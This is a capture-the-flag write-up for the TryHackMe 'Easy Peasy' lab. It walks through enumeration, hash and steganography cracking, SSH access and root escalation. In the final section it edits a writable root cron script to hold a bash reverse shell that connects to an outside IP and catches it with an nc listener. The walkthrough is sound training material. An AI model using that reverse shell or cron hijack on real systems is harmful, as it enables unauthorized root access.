---
title: "Easy Peasy - TryHackMe"
date: 2026-03-22 10:30:00 +0000
categories: [TryHackMe, Writeups]
tags: [ctf, web, ssh, steganography, privilege-escalation]
---

# Easy Peasy - TryHackMe
![1.png](/assets/img/writeups/easy-peasy/1.png)
**Difficulty**: Easy<br>**Time Required**: 25 min
## Reconnaissance
Start enumeration using nmap with the following syntax<br> `nmap -sV 10.67.153.180 -p- -T4`
![2.png](/assets/img/writeups/easy-peasy/2.png)
**Q1**: How many ports are open?
![3.png](/assets/img/writeups/easy-peasy/3.png)
**Q2**: What is the version of nginx?
![4.png](/assets/img/writeups/easy-peasy/4.png)
**Q3**: What is running on the highest port?
![5.png](/assets/img/writeups/easy-peasy/5.png)
## Exploitation
**Q1**: Using GoBuster, find flag 1.
The basic syntax for **GoBuster** (used to discover hidden content on web servers) is:<br> `gobuster dir -u 10.67.153.180:80 -w /usr/share/wordlists/dirb/common.txt`

- **dir** for directory enumeration
- **-u** for the target URL
- **-w** for wordlist
- **-x** to search for these file extensions

![6.png](/assets/img/writeups/easy-peasy/6.png)
![7.png](/assets/img/writeups/easy-peasy/7.png)
So, we need to further exploit this directory because it is hidden, and we did not find any other interesting directories using Gobuster.<br>`gobuster dir -u 10.67.153.180:80/hidden -w /usr/share/wordlists/dirb/common.txt`
![8.png](/assets/img/writeups/easy-peasy/8.png)
View the page source code, where there is a Base64-encoded string. Let’s decode it to obtain our first flag.
````
<p hidden>ZmxhZ3tmMXJzN19mbDRnfQ==</p>
````
![9.png](/assets/img/writeups/easy-peasy/9.png)
**Q2**: Further enumerate the machine, what is flag 2?
Visit the URL `http://10.67.153.180:65524/robots.txt`. There is an MD5 hash, copy it and crack it.
````
User-Agent:*
Disallow:/
Robots Not Allowed
User-Agent:a18672860d0510e5ab6699730763b250
Allow:/
This Flag Can Enter But Only This Flag No More Exceptions
````
![10.png](/assets/img/writeups/easy-peasy/10.png)
**Q3**: Crack the hash with `easypeasy.txt`, What is the flag 3?<br>
Flag 3 is already in plain text at `http://10.67.153.180:65524`
![11.png](/assets/img/writeups/easy-peasy/11.png)
**Q4**: What is the hidden directory?
Visit the page source of `http://10.67.153.180:65524` and search for the keyword “hidden.” You will find a Base62 string, copy it and decode it.
````
      <div class="page_header floating_element">
        <img src="/icons/openlogo-75.png" alt="Debian Logo" class="floating_element"/>
        <span class="floating_element">
          Apache 2 It Works For Me
	<p hidden>its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu</p>
        </span>
      </div>
````

![12.png](/assets/img/writeups/easy-peasy/12.png)
**Q5**: Using the wordlist that provided to you in this task crack the hash. what is the password?<br>
Visit the hidden directory and download the image, then use StegCracker to crack the password.
````
stegcracker binarycodepixabay.jpg easypeasy_1596838725703.txt
````
```
Successfully cracked file with password: mypasswordforthatjob
Tried 3585 passwords
Your file has been written to: binarycodepixabay.jpg.out
mypasswordforthatjob
````
**Q6**: What is the password to login to the machine via SSH?<br>
Note that there is an embedded file inside the downloaded image, extract it with the following command and copy the binary data, then take it to CyberChef and decode it.
````
Enter passphrase: 
  embedded file "secrettext.txt":
    size: 278.0 Byte
    encrypted: no
    compressed: no
````
````
steghide --extract -sf binarycodepixabay.jpg
````

````
cat secrettext.txt 
username:boring
password:
01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
````

![13.png](/assets/img/writeups/easy-peasy/13.png)
**Q7**: What is the user flag?<br>
Log in via SSH using the following command `ssh boring@10.67.153.180 -p6498` and open the `user.txt` file.
````
boring@kral4-PC:~$ cat user.txt
User Flag But It Seems Wrong Like It`s Rotated Or Something
synt{a0jvgf33zfa0ez4y
````
The flag is rotated, take it to CyberChef and apply ROT13.
![14.png](/assets/img/writeups/easy-peasy/14.png)

**Q8**: What is the root flag?<br>
Checked sudo using `sudo -l`, and the result showed that `boring` is not allowed to run sudo.<br>Checked cron using `cat /etc/crontab` and found the following entry:<br>`* * * * * root cd /var/www/ && sudo bash .mysecretcronjob.sh`<br>
This indicates that the cron job will be executed shortly.<br>In `/var/www/`, a writable file `.mysecretcronjob.sh` was found.<br>Edited `.mysecretcronjob.sh` to include a reverse shell payload:
````
#!/bin/bash
bash -i >& /dev/tcp/10.11.119.55/4444 0>&1
````

Started a listener on your machine using nc `-lvnp 4444`.<br>The flag file is hidden, so navigate to `/root`, run `ls -la` to reveal it, and then use `cat .root.txt` to view the flag.
